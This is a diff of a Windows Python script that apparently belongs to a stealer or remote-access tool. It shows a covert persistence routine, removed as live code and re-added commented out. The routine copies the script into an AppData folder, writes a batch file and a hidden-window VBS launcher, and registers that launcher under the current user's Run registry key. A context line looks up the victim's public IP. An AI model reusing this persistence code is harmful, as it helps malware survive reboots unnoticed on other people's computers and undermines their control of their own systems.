@@ -38,25 +38,26 @@ else:
               exit()
           except FileExistsError:
                  pass
-
-if os.path.exists(os.environ["appdata"] +'\\'+'FVHost'+os.path.basename(__file__)):
-    pass
-else:
-    try:
-        path = os.getcwd()+'\\'+os.path.basename(__file__)
-        newpath = os.mkdir(os.environ["appdata"]+'\\'+'FVHost')          
-        copy_path_new= shutil.copy(path,str(os.environ["appdata"])+'\\'+'FVHost'+'\\')
-        with open(str(os.environ["appdata"])+'\\'+'FVHost'+'\\'+'runcmd.bat','w')as filebat:
-            filebat.write(str(os.environ['Home'])+'\\appdata\\local\\Programs\\Python\\Python37\\'+'pythonw.exe  '+\
-                        os.environ["appdata"]+'\\'+'FVHost\\'+str(os.path.basename(__file__)))
-        with open(str(os.environ["appdata"])+'\\'+'FVHost'+'\\'+'autorun.vbs','w')as runtime:
-            runtime.write('Set WshShell = CreateObject("WScript.Shell")'+'\n'+'WshShell.Run chr(34) & '+'"'+\
-                          os.environ["appdata"]+'\\'+'FVHost\\'+'runcmd.bat " & Chr(34), 0'\
-                          +"\n"+"Set WshShell = Nothing"+'\n')
-        stratup_reg = str(os.environ["appdata"])+'\\'+'FVHost'+'\\'+'autorun.vbs'   
-        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Pythow /t REG_SZ /d "' +stratup_reg+ '"',shell=True )
-    except FileExistsError:
-           pass
+#if os.path.exists(os.environ["appdata"] +'\\'+'FVHost'+os.path.basename(__file__)):
+#    pass
+#else:
+#    try:
+#        path = os.getcwd()+'\\'+os.path.basename(__file__)
+#        newpath = os.mkdir(os.environ["appdata"]+'\\'+'FVHost')          
+#        copy_path_new= shutil.copy(path,str(os.environ["appdata"])+'\\'+'FVHost'+'\\')
+#        with open(str(os.environ["appdata"])+'\\'+'FVHost'+'\\'+'runcmd.bat','w')as filebat:
+#            filebat.write(str(os.environ['Home'])+'\\appdata\\local\\Programs\\Python\\Python37\\'+'pythonw.exe  '+\
+#                        os.environ["appdata"]+'\\'+'FVHost\\'+str(os.path.basename(__file__)))
+#        with open(str(os.environ["appdata"])+'\\'+'FVHost'+'\\'+'autorun.vbs','w')as runtime:
+#            runtime.write('Set WshShell = CreateObject("WScript.Shell")'+'\n'+'WshShell.Run chr(34) & '+'"'+\
+#                          os.environ["appdata"]+'\\'+'FVHost\\'+'runcmd.bat " & Chr(34), 0'\
+#                          +"\n"+"Set WshShell = Nothing"+'\n')
+#        startup_reg = str(os.environ["appdata"])+'\\'+'FVHost'+'\\'+'autorun.vbs'   
+#        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Pythow /t REG_SZ /d "' +startup_reg+ '"',shell=True )
+#        os.system(startup_reg) 
+#        exit()
+#    except FileExistsError:
+#           pass
 
 try:
     public_ip  = urllib.request.urlopen('http://api.ipify.org').read().decode('utf8')
